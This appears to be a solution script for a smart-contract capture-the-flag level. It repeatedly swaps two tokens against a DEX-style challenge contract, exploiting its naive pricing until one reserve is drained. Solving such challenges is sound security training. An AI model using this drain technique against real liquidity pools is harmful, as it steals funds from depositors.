from scripts.level_helper import *

@setup_instance
def main(instance, player, attack):
    t1 = SwappableToken.at(instance.token1())
    t2 = SwappableToken.at(instance.token2())

    instance.approve(instance, 2**256-1, {'from': player})

    # reserves
    res1 = lambda: t1.balanceOf(instance)
    res2 = lambda: t2.balanceOf(instance)

    # player balances
    bal1 = lambda: t1.balanceOf(player)
    bal2 = lambda: t2.balanceOf(player)

    r1 = res1()
    r2 = res2()
    b1 = bal1()
    b2 = bal2()
    while r1 and r2:
        if b1 >= r1:
            instance.swap(t1, t2, r1, {'from': player})
        elif b2 >= r2:
            instance.swap(t2, t1, r2, {'from': player})
        elif b1 == max(b1, b2):
            instance.swap(t1, t2, b1, {'from': player})
        else:
            instance.swap(t2, t1, b2, {'from': player})
        r1 = res1()
        r2 = res2()
        b1 = bal1()
        b2 = bal2()

    print(f'Reserves 1: {r1}, Reserves 2: {r2}')
    print(f'Balances 1: {b1}, Balances 2: {b2}')
    print(f'Total tokens: {r1+r2+b1+b2}')
